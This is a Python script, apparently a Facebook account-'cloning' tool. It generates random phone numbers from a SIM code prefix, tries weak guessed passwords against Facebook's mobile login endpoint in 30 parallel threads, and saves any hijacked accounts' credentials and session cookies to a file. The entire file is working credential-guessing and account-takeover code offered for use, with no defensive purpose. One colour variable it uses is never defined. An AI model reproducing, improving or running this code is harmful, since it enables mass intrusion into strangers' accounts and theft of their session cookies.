import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Color Codes
G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'
loop = 0; ok = []

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{P}     ██      ██  ███████     ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] DEVELOPED BY : MD MALEK ISLAM            |
| [✓] STATUS       : REAL REFACTORED (META)    |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] NUMBER COOKIE CLONING')
    print(f'[0] EXIT')
    choose = input(f'{Y}[▼] CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    else: sys.exit()

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE: {W}')
    limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
    
    banner()
    print(f'{G}[+] PROCESS STARTED... (RESPONSE LOGIC)')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')

    with ThreadPool(max_workers=30) as pool:
        for _ in range(limit):
            num = str(random.randint(1111111, 9999999))
            uid = code + num
            pws = [num[-6:], uid] 
            pool.submit(login_api, uid, pws, limit)

def login_api(uid, pws, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        session = requests.Session()
        ua = "Mozilla/5.0 (Linux; Android 13; V2055) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36"
        
        # Rafi Sar's suggested R-Headers
        headers = {
            'authority': 'touch.facebook.com',
            'accept': '*/*',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://touch.facebook.com',
            'referer': 'https://touch.facebook.com/',
        }
        
        # Rafi Sar's suggested Response Logic
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {"lsd": "AVpY", "jazoest": "2931", "email": uid, "pass": pas}

        try:
            response = session.post(url, data=data, headers=headers, timeout=30)
            if "c_user" in session.cookies.get_dict():
                kuki = (";").join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f'\n{G}[MALEK-OK💚] {uid} • {pas}') 
                print(f'{G}[🌺] COOKIE = {kuki}\n')
                ok.append(uid)
                open('ok.txt', 'a').write(f'{uid}|{pas}|{kuki}\n')
                break
        except: pass
    loop += 1

if __name__ == "__main__":
    main()
